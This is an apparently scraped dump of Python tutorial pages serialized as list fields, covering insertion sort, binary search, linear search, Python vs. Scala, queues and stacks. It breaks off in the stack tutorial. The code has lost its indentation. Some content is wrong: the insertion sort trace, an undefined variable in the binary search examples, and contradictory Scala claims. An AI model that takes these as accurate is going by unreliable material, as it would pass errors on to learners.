example."", 'We will consider the first element in the sorted array in the following array.', '[10, 4, 25, 1, 5]', 'The first step to add 10 to the sorted subarray', '[10, 4, 25, 1, 5]', '[10, 10, 25, 1, 5] (temp = 4)', 'Here the 4 is lesser than all elements in sorted subarray, so we insert it at the first index position.', '[4, 10, 25, 1, 5]', 'We have two elements in the sorted subarray.', '[4, 10, 25, 1, 5]', 'Again we check the number 1. We save it in temp. 1 is less than the 25. It overwrites the 25.', '[4, 10, 25, 25, 5] 10>1 then it overwrites again', '[4, 25, 10, 25, 5]', '[25, 4, 10, 25, 5] 4>1 now put the value of temp = 1', '[1, 4, 10, 25, 5]', 'Now, we have 4 elements in the sorted subarray. 5<25 then shift 25 to the right side and pass temp = 5 to the left side.', '[1, 4, 10, 25, 25] put temp = 5', 'Now, we get the sorted array by simply putting the temp value.', '[1, 4, 5, 10, 25]', 'The given array is sorted.', ""The implementation of insertion is relative easy. We will implement using the Python array of integers. Let's understand the following example -"", 'Python Program', 'Explanation:', 'In the above code, we have created a function called insertion_sort(list1). Inside the function -', ""Let's understand the following example of sorting custom objects."", 'First, we are defining the Point class:', 'Using the above code, we can sort the coordinate points. It will work for any type of the list.', 'Insertion sort is a slow algorithm; sometimes, it seems too slow for extensive dataset. However, it is efficient for small lists or array.', 'The time complexity of the insertion sort is - O(n2). It uses the two loops for iteration.', 'Another important advantage of the insertion sort is that; it is used by the popular sorting algorithm called Shell sort.', 'The auxiliary space in insertion sort: O(1)', 'Insertion sort is a simple and inefficient algorithm that has many advantages, but there are more efficient algorithms are available.', 'In this tutorial, we have discussed the concept of the insertion sort and its implementation using the Python programming language.']","['While the card-playing, we compare the hands of cards with each other. Most of the player likes to sort the card in the ascending order so they can quickly see which combinations they have at their disposal.', ""The insertion sort implementation is easy and simple because it's generally taught in the beginning programming lesson. It is an in-place and stable algorithm that is more beneficial for nearly-sorted or fewer elements."", 'The great thing about the insertion sort is if we insert the more elements to be sorted - the algorithm arranges the in its proper place without performing the complete sort.', 'The sorted part contains the first element of the array and other unsorted subpart contains the rest of the array. The first element in the unsorted array is compared to the sorted array so that we can place it into a proper sub-array.', 'Now we take the first element from the unsorted array - 4. We store this value in a new variable temp. Now, we can see that the 10>4 then we move the 10 to the right and that overwrite the 4 that was previously stored.', 'Now check the number 25. We have saved it into the temp variable. 25> 10 and also 25> 4 then we put it in the third position and add it to the sorted sub array.', 'Python provides the flexibility to change the algorithm using a custom object. We will create a custom class and redefine the actual comparison parameter and try to keep the same code as the above.']","['We would require to overload the operators in order to sort the objects in a different way. But, we can pass another argument to the insertion_sort() function by using the lambda function. The lambda function is a convenient when calling the sorting method.']","['# creating a function for insertion', 'def insertion_sort(list1):', '# Outer loop to traverse through 1 to len(list1)', 'for i in range(1, len(list1)):', 'value = list1[i]', '# Move elements of list1[0..i-1], that are', '# greater than value, to one position ahead', '# of their current position', 'j = i - 1', 'while j >= 0 and value < list1[j]:', 'list1[j + 1] = list1[j]', 'j -= 1', 'list1[j + 1] = value', 'return list1', '# Driver code to test above', 'list1 = [10, 5, 13, 8, 2]', 'print(""The unsorted list is:"", list1)', 'print(""The sorted list1 is:"", insertion_sort(list1))', '# Creating Point class', 'class Point:', 'def __init__(self, a, b):', 'self.a = a', 'self.b = b', 'def __str__(self):', 'return str.format(""({},{})"", self.a, self.b)', 'def insertion_sort(list1, compare_function):', 'for i in range(1, len(list1)):', 'Value = list1[i]', 'Position = i', 'while Position > 0 and compare_function(list1[Position - 1], Value):', 'list1[Position] = list1[Position - 1]', 'Position = Position - 1', 'list1[Position] = Value', 'U = Point(2,3)', 'V = Point(4,4)', 'X = Point(3,1)', 'Y = Point(8,0)', 'Z = Point(5,2)', 'list1 = [U,V,X,Y,Z]', '# We sort by the x coordinate, ascending', 'insertion_sort(list1, lambda x, y: x.a > y.a)', 'for point in list1:', 'print(point)']","['The unsorted list is: [10, 5, 13, 8, 2]', 'The sorted list1 is: [2, 5, 8, 10, 13]', 'The points are in the sorted order', '(2,3)', '(3,1)', '(4,4)', '(5,2)', '(8,0)']",[],"['|||In-place: The in-place algorithm requires additional space without caring for the input size of the collection. After performing the sorting, it rewrites the original memory locations of the elements in the collection.|||Stable: The stable is a term that manages the relative order of equal objects from the initial array.||||||Spilt a list in two parts - sorted and unsorted.|||Iterate from arr[1] to arr[n] over the given array.|||Compare the current element to the next element.|||If the current element is smaller than the next element, compare to the element before, Move to the greater elements one position up to make space for the swapped element.||||||We defined for loop for traverse the list from 1 to len(list1).|||In for loop, assigned a values of list1 in value Every time the loop will iterate the new value will assign to the value variable.|||Next, we moved the elements of list1[0…i-1], that are greater than the value, to one position ahead of their current position.|||Now, we used the while to check whether the j is greater or equal than 0, and the value is smaller than the first element of the list.|||If both conditions are true then move the first element to the 0th index and reduce the value of j and so on.|||After that, we called the function and passed the list and printed the result.|||']"
125,['Binary Search in Python'],"[""This tutorial will learn how we can apply a binary search algorithm using Python to find an element's index position in the given list.""]","['https://www.javatpoint.com/linear-search-in-python', 'https://www.javatpoint.com/insertion-sort-in-python', 'https://www.javatpoint.com/linear-search-in-python', 'https://www.javatpoint.com/insertion-sort-in-python', 'https://www.javatpoint.com/linear-search-in-python']",['https://static.javatpoint.com/python/images/binary-search-in-python.png'],[],"['Introduction', 'Concept of Binary Search', 'Implement a Binary Search in Python', 'Recursive Binary Search', 'Complexity', 'Conclusion']","['Python Implementation', 'Python Program']",[],"['There are many searching algorithms but the binary search is most popular among them.', 'The elements in the list must be sorted to apply the binary search algorithm. If elements are not sorted then sort them first.', ""Let's understand the concept of binary search."", 'In the binary search algorithm, we can find the element position using the following methods.', ""Let's have a step by step implementation of binary search."", 'We have a sorted list of elements, and we are looking for the index position of 45.', '[12, 24, 32, 39, 45, 50, 54]', 'Next, we calculate the value of the middle element in the array.', 'If the number we are searching equal to the mid. Then return mid otherwise move to the further comparison.', 'Otherwise, compare the n with the middle element of the elements on the left side of mid and set high to high = mid - 1.', 'Repeat until the number that we are searching for is found.', ""Let's understand the following program of the iterative method."", 'Explanation:', 'In the above program -', ""Let's understand the recursive method of binary search."", ""Let's understand the above program using the recursive function."", 'Explanation', 'We have discussed both methods to find the index position of the given number.']","['The divide and conquer approach technique is followed by the recursive method. In this method, a function is called itself again and again until it found an element in the list.', ""A set of statements is repeated multiple times to find an element's index position in the iterative method. The while loop is used for accomplish this task."", ""Binary search is more effective than the linear search because we don't need to search each list index. The list must be sorted to achieve the binary search algorithm."", 'So, we are setting two pointers in our list. One pointer is used to denote the smaller value called low and the second pointer is used to denote the highest value called high.', 'Now, we will compare the searched element to the mid index value. In this case, 32 is not equal to 45. So we need to do further comparison to find the element.', 'The number to be search is greater than the middle number, we compare the n with the middle element of the elements on the right side of mid and set low to low = mid + 1.', 'First, we implement a binary search with the iterative method. We will repeat a set of statements and iterate every item of the list. We will find the middle value until the search is complete.', 'The recursion method can be used in the binary search. In this, we will define a recursive function that keeps calling itself until it meets the condition.', 'The above program is similar to the previous program. We declared a recursive function and its base condition. The condition is the lowest value is smaller or equal to the highest value.', 'In the last part, we have written our main program. It is the same as the previous program, but the only difference is that we have passed two parameters in the binary_search() function.', ""This is because we can't assign the initial values to the low, high and mid in the recursive function. Every time the recursive is called the value will be reset for those variables. That will give the wrong result.""]","[""A binary search is an algorithm to find a particular element in the list. Suppose we have a list of thousand elements, and we need to get an index position of a particular element. We can find the element's index position very fast using the binary search algorithm."", 'The complexity of the binary search algorithm is O(1) for the best case. This happen if the element that element we are looking find in the first comparison. The O(logn) is the worst and the average case complexity of the binary search. This depends upon the number of searches are conducted to find the element that we are looking for.', 'A binary search algorithm is the most efficient and fast way to search an element in the list. It skips the unnecessary comparison. As the name suggests, the search is divided into two parts. It focuses on the side of list, which is close to the number that we are searching.']","['mid = (low+high)/2', 'Here, the low is 0 and the high is 7.', 'mid = (0+7)/2', 'mid = 3 (Integer)', '# Iterative Binary Search Function method Python Implementation', '# It returns index of n in given list1 if present,', '# else returns -1', 'def binary_search(list1, n):', 'low = 0', 'high = len(list1) - 1', 'mid = 0', 'while low <= high:', '# for get integer result', 'mid = (high + low) // 2', '# Check if n is present at mid', 'if list1[mid] < n:', 'low = mid + 1', '# If n is greater, compare to the right of mid', 'elif list1[mid] > n:', 'high = mid - 1', '# If n is smaller, compared to the left of mid', 'else:', 'return mid', '# element was not present in the list, return -1', 'return -1', '# Initial list1', 'list1 = [12, 24, 32, 39, 45, 50, 54]', '# Function call', 'result = binary_search(list1, n)', 'if result != -1:', 'print(""Element is present at index"", str(result))', 'print(""Element is not present in list1"")', '# Python program for recursive binary search.', '# Returns index position of n in list1 if present, otherwise -1', 'def binary_search(list1, low, high, n):', '# Check base case for the recursive function', 'if low <= high:', 'mid = (low + high) // 2', '# If element is available at the middle itself then return the its index', 'if list1[mid] == n:', 'return mid', '# If the element is smaller than mid value, then search moves', '# left sublist1', 'elif list1[mid] > n:', 'return binary_search(list1, low, mid - 1, n)', '# Else the search moves to the right sublist1', 'else:', 'return binary_search(list1, mid + 1, high, n)', 'else:', '# Element is not available in the list1', 'return -1', '# Test list1ay', 'list1 = [12, 24, 32, 39, 45, 50, 54]', '# Function call', 'res = binary_search(list1, 0, len(list1)-1, n)', 'if res != -1:', 'print(""Element is present at index"", str(res))', 'print(""Element is not present in list1"")']","['Element is present at index 4', 'Element is present at index 2']",[],"['|||Recursive Method|||Iterative Method||||||We have created a function called binary_search() function which takes two arguments - a list to sorted and a number to be searched.|||We have declared two variables to store the lowest and highest values in the list. The low is assigned initial value to 0, high to len(list1) - 1 and mid as 0.|||Next, we have declared the while loop with the condition that the lowest is equal and smaller than the highest The while loop will iterate if the number has not been found yet.|||In the while loop, we find the mid value and compare the index value to the number we are searching for.|||If the value of the mid-index is smaller than n, we increase the mid value by 1 and assign it to The search moves to the left side.|||Otherwise, decrease the mid value and assign it to the high. The search moves to the right side.|||If the n is equal to the mid value then return mid.|||This will happen until the low is equal and smaller than the high.|||If we reach at the end of the function, then the element is not present in the list. We return -1 to the calling function.||||||We calculate the middle number as in the last program.|||We have used the if statement to proceed with the binary search.|||If the middle value equal to the number that we are looking for, the middle value is returned.|||If the middle value is less than the value, we are looking then our recursive function binary_search() again and increase the mid value by one and assign to low.|||If the middle value is greater than the value we are looking then our recursive function binary_search() again and decrease the mid value by one and assign it to low.|||']"
126,['Linear Search in Python'],"['Python is one of the most popular and powerful languages. It takes a few lines to execute the code, which makes it much user-friendly language. In this tutorial, we will learn the linear search in Python. Searching is a technique to find the particular element is present or not in the given list.']","['https://www.javatpoint.com/python-vs-scala', 'https://www.javatpoint.com/binary-search-in-python', 'https://www.javatpoint.com/python-vs-scala', 'https://www.javatpoint.com/binary-search-in-python', 'https://www.javatpoint.com/python-vs-scala']","['https://static.javatpoint.com/python/images/linear-search-in-python.png', 'https://static.javatpoint.com/python/images/linear-search-in-python2.png', 'https://static.javatpoint.com/python/images/linear-search-in-python3.png']",[],"['What is a Linear Search?', 'Concept of Linear Search', 'Linear Search Algorithm', 'Python Program', 'Linear Search Complexity']",[],[],"['There are two types of searching -', 'Both techniques are widely used to search an element in the given list.', ""Let's understand the following steps to find the element key = 7 in the given list."", 'Step - 1: Start the search from the first element and Check key = 7 with each element of list x.', 'Step - 2: If element is found, return the index position of the key.', 'Step - 3: If element is not found, return element is not present.', 'There is list of n elements and key value to be searched.', 'Below is the linear search algorithm.', ""Let's understand the following Python implementation of the linear search algorithm."", 'Explanation:', 'Time complexity of linear search algorithm -', 'To get the fast result, we can use the binary search algorithm.']","['Linear search is a method of finding elements within a list. It is also called a sequential search. \xa0It is the simplest searching algorithm because it searches the desired element in a sequential manner.', ""It compares each and every element with the value that we are searching for. If both are matched, the element is found, and the algorithm returns the key's index position."", 'We have discussed the basic concept of the linear search. In the next tutorial, we will learn the second and most popular searching algorithm named Binary search.']","['In the above code, we have created a function linear_Search(), which takes three arguments - list1, length of the list, and number to search. We defined for loop and iterate each element and compare to the key value. If element is found, return the index else return -1 which means element is not present in the list.', 'Linear search algorithm is suitable for smaller list (<100) because it check every element to get the desired number. Suppose there are 10,000 element list and desired element is available at the last position, this will consume much time by comparing with each element of the list.']","['LinearSearch(list, key)', 'for each item in the list', 'if item == value', 'return its index position', 'return -1', 'def linear_Search(list1, n, key):', '# Searching list1 sequentially', 'for i in range(0, n):', 'if (list1[i] == key):', 'return i', 'return -1', 'list1 = [1 ,3, 5, 4, 7, 9]', 'key = 7', 'n = len(list1)', 'res = linear_Search(list1, n, key)', 'if(res == -1):', 'print(""Element not found"")', 'print(""Element found at index: "", res)']",['Element found at index:  4'],[],['|||Linear Search|||Binary Search||||||Base Case - O(1)|||Average Case - O(n)|||Worst Case -O(n)|||']
127,['Python vs. Scala'],"[""In this tutorial, we will learn the basic difference between Python and Scala. Both languages have some similarities but here we will see the main difference between them. Let's start with their introduction.""]","['https://www.javatpoint.com/queue-in-python', 'https://www.javatpoint.com/linear-search-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/scala-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/jvm-java-virtual-machine', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/object-and-class-in-java#class', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/queue-in-python', 'https://www.javatpoint.com/linear-search-in-python', 'https://www.javatpoint.com/queue-in-python']",[],[],"['Difference between Python and Scala', 'Conclusion']","['What is Python?', 'What is Scala?']",[],"[""Let's understand the following major difference between Python and Scala.""]",['Its static types helps programmer to avoid bug in the complex program. The JavaScript and JVM allow us to build the high-performance systems and that can be easily accessible to huge ecosystem of libraries.'],"['Python is high-level, general purpose, and user-friendly dynamic programming language. It is easy to learn and take fewer lines to execute a code. Python provides many in-built libraries, modules and many other features. It is the one of the most popular programming languages.', 'Programmers prefer this language because of its simplicity, vast number of libraries, built-in modules. It is a very attractive language for Rapid Application Development. Python is used almost every domains such as web development, machine learning, artificial intelligence and many more. It is object-oriented programming.', 'Scala stands for ""scalable language, it is a general purpose, high-level programming language. It combines functional programming and object-oriented programming. It works upon the JVM (Java Virtual Machine) and includes with the prevailing Java Code and libraries.', 'In comparison of the other languages, scala code is error-free, short and readable. It is simple to use for writing, compiling, running programs and debugging. The scala source code is developed in a unique manner that its compiler can interpret the Java classes.', ""We have listed above all the important difference between Python and Scala. Both languages are quite different for each other but Python is a more popular and highly developed programming language. On the other hand, Scala doesn't have widespread use or knowledge base."", 'The selection of the programming language entirely depends upon the features that best fit for the project need as both languages have pros and cons. It totally depends on the project requirements, time and efficiency and many other different discussed aspects. We can select any language to achieve the goal. Developer should analyze and must be familiar with the merits or demerits of programming languages.']",[],[],"[""Sr.|||Python|||Scala&&&1.|||Python is object oriented, dynamic type programming language.|||Scala is object oriented, static type programming language.&&&2.|||Python is easy to learn.|||Scala is easier to learn than the Python.&&&3.|||It doesn't need to specify the data type while declaring variables because it is a dynamic type programming language.|||In Scala, we need to define the type of variable and object because Scala is statically type programming language.&&&4.|||Python is slow because it runs on interpreter and creates extra work for it.|||There is no extra work created because and thus it runs much faster than the Python.&&&5.|||Python decides the data type at runtime.|||Scala doesn't use this case that's why it is more preferred language for large data process than Python. &&&6.|||Python has huge community across the world.|||Scala also has large community but not as Python.&&&7.|||Python is most recommended language for beginners because easy to write code in Python.|||Scala is easy to learn than Python but difficult to write code in Python.&&&8.|||Python provides wide range of the libraries and modules and there is an interface in Python to many OS system call and libraries.|||Scala is compiled language that's why source code is compiled before execution.&&&9.|||There is much chance to create bug when we make the change in the existing Python code then|||There is no such type of problem.&&&10.|||Python doesn't support proper multithreading, through it supports heavyweight process forking.|||Scala has a list of asynchronous libraries and reactive cores and hence it is better choice for implementing concurrently.&&&11.|||Python consists of proper data science of tools for machine learning and Natural language processing (NLP).|||Scala contains various existential types, macros, and implicit. The syntax with advance features may be little hard as compared to usual functions and however allow the developers to make good use of these features.&&&12.|||Python has extensive developer pool.|||Scala has limited developer pool.&&&13.|||Python is not suitable for concurrent programming.|||Scala is quite suitable for the concurrent programming.&&&14.|||Python can be used for the small scale project.|||Scala can be used for large-scale projects.&&&15.|||There are no scalable features.|||It provides scalable features support.""]",[]
128,['Queue in Python'],"[""In this tutorial, we will discuss the Queue's basic concepts and built-in Queue class and implement it using the Python code.""]","['https://www.javatpoint.com/stack-in-python', 'https://www.javatpoint.com/python-vs-scala', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/stack-in-python', 'https://www.javatpoint.com/python-vs-scala', 'https://www.javatpoint.com/stack-in-python']",[],[],"['Operations in Python', 'Methods Available in Queue', 'The built-in Python List', 'Adding Element to a Queue (Enqueue)', 'Removing Element from a Queue (Dequeue)', 'Sorting the Queue', 'The Queue Module', 'Working With queue.Queue Class', 'Working With collection.deque Class', 'The multiprocessing.Queue Class', 'Priority Queue in Python', 'Manually Sorted List', 'The queue.PriorityQueue Class', 'Conclusion']",['What is the Queue?'],[],"['The operating system manages the queue for processing the various processes within a computer.', 'We can perform the following operations in the Queue.', 'Python provides the following methods, which are commonly used to perform the operation in Queue.', 'We will learn these functions in the below sections.', 'Explanation -', 'We have defined the empty list in the above code and inserted a few elements using append() method. It will add an element to the end of the list.', 'Explanation -', 'In the following example, we have sorted the elements of the queue.', 'We can perform all the operation using the in-built queue class.', 'The deque class can be used in both Queue and as stacks because it removes and adds elements effectively.', ""The collection.deque can be a good choice for queue data structure in Python's standard library."", 'Priority queues are most beneficial to handling scheduling problems where some tasks will happen based on priorities.', ""There are various ways to implement a priority queue in Python. Let's understand the following ways."", 'Therefore sorted list can be effective when there are will be few insertions into the priority queue.', ""Let's understand the following example -"", 'This priority queue implements uses heapq internally and shares the same time and space complexities.', 'The difference is the priority queue is coordinated and delivers locking semantics to backing multiple concurrent events and consumers.', 'We can choose any priority queue implementation in the Python program but keep in mind that queue.PriorityQueue is good default choice.']","[""We can add the element from to the rear end. This process is also called enqueue. We create a Queue class where we will implement the First-in-First-Out concept. Let's understand the following example."", 'We can remove the element form the rear end. This process is called a dequeue. In the following example, we use the built-in pop() method to remove an element from the list.', 'In the remove_element() function block, we check the condition of whether a queue is not underflow. If it returns false, then remove the element one by one.', 'Python provides the queue module to implement multi-producer, multi-consumer queues. The queue module offers Queue class which is especially used for the threaded programming. The Queue class implements all the required locking semantics.', ""The queue module contains several classes. The Queue is one of the important classes of them. This is very useful in the parallel computing and multiprogramming. Let's understand the following example of the queue. Queue class0uii"", 'The collection.deque class is used to implement a double-ended queue that supports adding and removing element from both ends. It takes O(1) time to complete the process.', 'A priority queue is a special type of queue in the data-structure. As the name suggest, it sorts the elements and dequeues the elements based on their priorities.', 'Unlike normal queue, it retrieves the highest-priority element instead of the next element. The priority of individual elements is decided by ordering applied to their keys.', 'For example - An operating system task is the best example of a priority queue - It executes the high precedence over lower-priority tasks (downloading updates in the background). The task scheduler can allow the highest-priority tasks to run first.', 'We can use the sorted Python list as the priority queue to quickly identify and delete the smaller and largest element. But inserting the new element is slow as it takes O(n) operations.', 'We have discussed all the basic concepts of queue and its implementation. It is similar to the standard list, but performance-wise it is always better. We have also defined the priority queue and its various ways of implementation.']","['A queue is a linear type of data structure used to store the data in a sequentially. The concept of queue is based on the FIFO, which means ""First in First Out"". It is also known as ""first come first severed"". The queue has the two ends front and rear. The next element is inserted from the rear end and removed from the front end.', 'For example - There are 20 computers in the computer science lab and connected to a single printer. The students want to print their paper; the printer will print the first task and second, so on. If we are the last in line, we need to wait until all other tasks are completed that ahead of ours.', ""The list can be used as the queue, but it is not suitable for a performance perspective. Python provides built-in methods insert() and pop() function to add and remove elements. Lists are quite slow because if we insert a new element to the list, all elements require shifting by one. It takes O(n) time. So lists are recommended in-place of queue. Let's understand the following example of how a list can be used as a queue."", 'In the above code, we have defined a class named Queue and constructor in it. We assigned an list constructor to the queue variable. Then, we defined two methods - add_element() and remove_element(). In the add_element() block, we check the condition if the value is not in Queue. If value is not present, insert the element.', ""The multiprocessing.Queue class is used to implement queued items for processed in parallel by multicurrent workers. The multiprocessing.Queue shares data between processes and can store any pickle-able object. Let's understand the following example.""]","['que = []', ""que.append('Apple')"", ""que.append('Mango')"", ""que.append('Papaya')"", 'print(que)', '# List is slow!', 'print(que.pop(0))', 'class Queue:', 'def __init__(self):', 'self.queue = list()', 'def add_element(self,val):', '# Insert method to add element', 'if val not in self.queue:', 'self.queue.insert(0,val)', 'return True', 'return False', 'def size(self):', 'return len(self.queue)', 'TheQueue = Queue()', 'TheQueue.add_element(""Apple"")', 'TheQueue.add_element(""Mango"")', 'TheQueue.add_element(""Guava"")', 'TheQueue.add_element(""Papaya"")', 'print(""The length of Queue: "",TheQueue.size())', 'class Queue:', 'def __init__(self):', 'self.queue = list()', 'def add_element(self,val):', '# Insert method to add element', 'if val not in self.queue:', 'self.queue.insert(0,val)', 'return True', 'return False', '# Pop method to remove element', 'def remove_element(self):', 'if len(self.queue)>0:', 'return self.queue.pop()', 'return (""Queue is Empty"")', 'que = Queue()', 'que.add_element(""January"")', 'que.add_element(""February"")', 'que.add_element(""March"")', 'que.add_element(""April"")', 'print(que)', 'print(que.remove_element())', 'print(que.remove_element())', 'import queue', 'q = queue.Queue()', 'q.put(14)', 'q.put(27)', 'q.put(11)', 'q.put(4)', 'q.put(1)', '# Here, we use bubble sort algorithm for sorting', 'n =  q.qsize()', 'for i in range(n):', '# Remove the element', 'x = q.get()', 'for j in range(n-1):', '# Remove the element', 'y = q.get()', 'if x > y :', '# put the smaller element at the beginning of the queue', 'q.put(y)', 'else:', '# the smaller one is put at the start of the queue', 'q.put(x)', 'x = y    # The greater element is replaced by the x and check again', 'q.put(x)', 'while (q.empty() == False):', 'print(q.queue[0], end = "" "")', 'q.get()', 'from queue import Queue', 'que = Queue()', ""que.put('Apple')"", ""que.put('Mango')"", ""que.put('Papaya')"", 'print(que)', 'print(que.get())', 'print(que.get())', 'print(que.get())', 'print(que.get_nowait())', 'print(que.get())', 'from collections import deque', 'que = deque()', ""que.append('Apple')"", ""que.append('Mango')"", ""que.append('Banana')"", 'print(que)', ""deque(['Apple ', 'Mango', 'Banana'])"", 'print(que.popleft())', 'print(que.popleft())', 'print(que.popleft())', 'que.popleft()', 'from multiprocessing import Queue', 'que = Queue()', ""que.put('Apple')"", ""que.put('Mango')"", ""que.put('Banana')"", 'print(que)', 'print(que.get())', 'print(que.get())', 'print(que.get())', 'pri_que = []', ""pri_que.append((2, 'Apple'))"", ""pri_que.append((1, 'Mango'))"", ""pri_que.append((3, 'Banana'))"", '# NOTE: Remember to re-sort every time', '#       a new element is inserted.', 'pri_que.sort(reverse=True)', 'while pri_que:', 'next_item = pri_que.pop()', 'print(next_item)', 'from queue import PriorityQueue', 'q = PriorityQueue()', ""q.put((2, 'Apple'))"", ""q.put((1, 'Banana'))"", ""q.put((3, 'Mango'))"", 'while not q.empty():', 'next_item = q.get()', 'print(next_item)']","[""['Apple', 'Mango', 'Papaya']"", 'Apple', 'The length of Queue:  4', 'January', 'February', '1 4 11 14 27', '<queue.Queue object at 0x00000114B30656A0>', 'Apple', 'Mango', 'Papaya', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/Queue.py"", line 78, in <module>', 'print(que.get_nowait())', 'File ""C:\\Python\\lib\\queue.py"", line 198, in get_nowait', 'return self.get(block=False)', 'File ""C:\\Python\\lib\\queue.py"", line 167, in get', 'raise Empty', '_queue.Empty', ""deque(['Apple', 'Mango', 'Banana'])"", 'Apple', 'Mango', 'Banana', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/Queue.py"", line 101, in <module>', 'que.popleft()', 'IndexError: pop from an empty deque', '<multiprocessing.queues.Queue object at 0x000002CA073356A0>', 'Apple', 'Mango', 'Banana', ""(1, 'Mango')"", ""(2, 'Apple')"", ""(3, 'Banana')"", ""(1, 'Banana')"", ""(2, 'Apple')"", ""(3, 'Mango')""]",[],"['|||Enqueue - The enqueue is an operation where we add items to the queue. If the queue is full, it is a condition of the Queue The time complexity of enqueue is O(1).|||Dequeue - The dequeue is an operation where we remove an element from the queue. An element is removed in the same order as it is inserted. If the queue is empty, it is a condition of the Queue Underflow. The time complexity of dequeue is O(1).|||Front - An element is inserted in the front end. The time complexity of front is O(1).|||Rear - An element is removed from the rear end.. The time complexity of the rear is O(1).||||||put(item) - This function is used to insert element to the queue.|||get() - This function is used to extract the element from the queue.|||empty() - This function is used to check whether a queue is empty or not. It returns true if queue is empty.|||qsize - This function returns the length of the queue.|||full() - If the queue is full returns true; otherwise false.|||']"
129,['Stack in Python'],"['In this tutorial, we will learn the basics of the stack and implement it using the Python code.']","['https://www.javatpoint.com/heap-sort-in-python', 'https://www.javatpoint.com/queue-in-python', 'https://www.javatpoint.com/heap-sort-in-python', 'https://www.javatpoint.com/queue-in-python', 'https://www.javatpoint.com/heap-sort-in-python']",[],[],"['Implementation of Stack', 'Implementation Using queue module', 'Python Stacks and Threading', 'Which Implementation of Stack Should Consider?', 'Conclusion']","['What is a Stack?', 'Methods of Stack', 'Implementation Using List', 'Implementation using collection.deque', 'Deque Vs. list']",[],"['Python provides the following methods that are commonly used with the stack.', 'Python offers various ways to implement the stack. In this section, we will discuss the implementation of the stack using Python and its module.', 'We can implement a stack in Python in the following ways.', 'Explanation - ', ""Let's understand the following example -"", 'Explanation:', 'Below are a few methods that available in the queue.', ""Let's understand the following example of the queue module."", 'Explanation -', 'We can build the multithreading program using the deque, but it may cause few complexities in the future.', 'Now the question arises, how we can build a program of Python stack with threading.', 'We have mentioned three methods of implement the stack in Python. The above methods have their own advantages or disadvantages.']","['We always pick the last plate from the stack of the plate. In stack, the new element is inserted at the one end and an element can be removed only that end.', 'We can perform the two operations in the stack - PUSH and POP. The PUSH operation is when we add an element and the POP operation is when we remove an element from the stack.', ""The list stores the new element in the next to other. If the list grows and out of a block of memory then Python allocates some memory. That's why the list become slow. Let's understand the following example -"", 'The above code is almost similar to the previous example. However, the only difference is that, we have imported the deque from the collection module.', 'The list consumes extra time to append() some objects than others. If the block of contiguous memory is full, it will get another block that can take much a longer time than a normal append() function.', 'The queue module has the LIFO queue, which is the same as the stack. Generally, the queue uses the put() method to add the data and the () method to take the data.', 'We can also use Python stack in the multi-threaded program. It is an advanced topic but not frequently used so you can skip this section if you are not interested in threading.', 'The list and deque behave differently if we are using threading in our program. Using a list in multi-threading programming can be dangerous because it is not thread-safe.', 'On the other hand, the deque is a little bit complex because its append() and pop() methods are atomic, which means they will not interrupt by other thread.', 'The answer is that we can use the LIFOqueue and we know that what LIFO stands for - Last In First Out. It uses the put() and gets() to add and remove the stack element.', 'Let us cleat the confusion; we are using stack with the threading, you should use the Lifoqueue but make sure about its performance for popping and pushing elements. But if you are not using threading, use a deque.', ""We can also use the list to implement the stack but the list can have potential memory reallocation issues. The list and deque are same in the interface, but the deque doesn't memory allocation issues."", 'We have defined a stack and its implementation in brief. Python stack can be used in real-life programs. We can choose either implement the method according to our requirements. We have also defined the Python stack with threading environment.']","['A stack is a linear data structure where data is arranged objects on over another. It stores the data in LIFO (Last in First Out) manner. The data is stored in a similar order as plates are arranged one above another in the kitchen. The simple example of a stack is the Undo feature in the editor. The Undo feature works on the last event that we have done.', 'Python list can be used as the stack. It uses the append() method to insert elements to the list where stack uses the push() method. The list also provides the pop() method to remove the last element, but there are shortcomings in the list. The list becomes slow as it grows.', 'In the above code, we have defined an empty list. We inserted the elements one by one using the append() method. That is similar to the push() method. We also removed the elements using the pop() method. The pop() method returns the last element of the list.', 'The collection module provides the deque class, which is used to creating Python stacks. The deque is pronounced as the ""deck"" which means ""double-ended queue"". The deque can be preferred over the list because it performs append and pop operation faster than the list. The time complexity is O(1), where the list takes O(n).', 'The list stores the element right next to each other and uses the contiguous memory. This is most effective for the several operations, like indexing into the list. For example - Getting list1[2] is fast as Python knows the exact position of a particular element. The contiguous memory also allows slice to work well on the lists.', 'In the above, we have imported the queue module that is a LIFOqueue. It works the same as the stack but this module includes some additional functions mentioned above. We defined a stack with the maxsize that means it can hold maximum five values in it.', 'The initial array size is zero; we pushed three elements in the stack using the put() method. Now, again we checked whether a stack is empty and size of the stack. We have three elements in the stack. We popped the element using the get() method. It removes the last added element first. After removing the entire elements, we get an empty stack.']","['# initial empty stack', 'my_stack = []', '# append() function to push', '# element in the my_stack', ""my_stack.append('x')"", ""my_stack.append('y')"", ""my_stack.append('z')"", 'print(my_stack)', '# pop() function to pop', '# element from my_stack in', '# LIFO order', ""print('\\nElements poped from my_stack:')"", 'print(my_stack.pop())', 'print(my_stack.pop())', 'print(my_stack.pop())', ""print('\\nmy_stack after elements are poped:')"", 'print(my_stack)', 'from collections import deque', 'my_stack = deque()', '# append() function is used to push', '# element in the my_stack', ""my_stack.append('a')"", ""my_stack.append('b')"", ""my_stack.append('c')"", ""print('Initial my_stack:')"", 'print(my_stack)', '# pop() function is used to pop', '# element from my_stack in', '# LIFO order', ""print('\\nElements poped from my_stack:')"", 'print(my_stack.pop())', 'print(my_stack.pop())', 'print(my_stack.pop())', ""print('\\nmy_stack after elements are poped:')"", 'print(my_stack)', '# Implementing stack using the queue module', 'from queue import LifoQueue', '# Initializing a my_stack stack with maxsize', 'my_stack = LifoQueue(maxsize = 5)', '# qsize() display the number of elements', '# in the my_stack', 'print(my_stack.qsize())', '# put() function is used to push', '# element in the my_stack', ""my_stack.put('x')"", ""my_stack.put('y')"", ""my_stack.put('z')"", 'print(""Stack is Full: "", my_stack.full())', 'print(""Size of Stack: "", my_stack.qsize())', '# To pop the element we used get() function', '# from my_stack in', '# LIFO order', ""print('\\nElements poped from the my_stack')"", 